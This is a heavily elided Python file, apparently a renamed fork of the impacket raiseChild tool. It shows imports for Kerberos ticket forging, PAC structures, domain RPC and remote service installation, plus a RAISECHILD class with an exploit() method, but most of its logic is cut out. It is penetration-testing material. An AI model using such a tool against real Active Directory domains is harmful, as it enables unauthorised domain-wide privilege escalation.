...
try:
    import pyasn1
     ...
     sys.exit(1)
from neroimpacket import version
from neroimpacket.krb5.types import Principal, KerberosTime
from neroimpacket.krb5 import constants
from neroimpacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, KerberosError
from neroimpacket.krb5.asn1 import AS_REP, AuthorizationData, AD_IF_RELEVANT, EncTicketPart
from neroimpacket.krb5.crypto import Key, _enctype_table, _checksum_table, Enctype
from neroimpacket.dcerpc.v5.ndr import NDRULONG
from neroimpacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from neroimpacket.examples import logger
from neroimpacket.examples.utils import parse_credentials
from neroimpacket.ntlm import LMOWFv1, NTOWFv1
from neroimpacket.dcerpc.v5.dtypes import RPC_SID, MAXIMUM_ALLOWED
from neroimpacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from neroimpacket.dcerpc.v5.nrpc import MSRPC_UUID_NRPC, hDsrGetDcNameEx
from neroimpacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, POLICY_LOOKUP_NAMES, LSAP_LOOKUP_LEVEL, hLsarLookupSids
from neroimpacket.dcerpc.v5.lsad import hLsarQueryInformationPolicy2, POLICY_INFORMATION_CLASS, hLsarOpenPolicy2
from neroimpacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, \
    PAC_PRIVSVR_CHECKSUM, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, VALIDATION_INFO
from neroimpacket.dcerpc.v5 import transport, drsuapi, epm, samr
from neroimpacket.smbconnection import SessionError
from neroimpacket.nt_errors import STATUS_NO_LOGON_SERVERS
from neroimpacket.smbconnection import SMBConnection, smb
from neroimpacket.structure import Structure
from neroimpacket.examples import remcomsvc, serviceinstall
...
class RAISECHILD:
            ...
            try:
                ...
                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                    ...
                    if childCreds['lmhash'] == '' and childCreds['nthash'] == '':
                        from neroimpacket.ntlm import compute_lmhash, compute_nthash
    ...
    def exploit(self):
        ...
        if self.__writeTGT is not None:
            ...
            from neroimpacket.krb5.ccache import CCache
            ccache = CCache()
        ...
        if self.__target is not None:
            ...
            from neroimpacket.smbconnection import SMBConnection
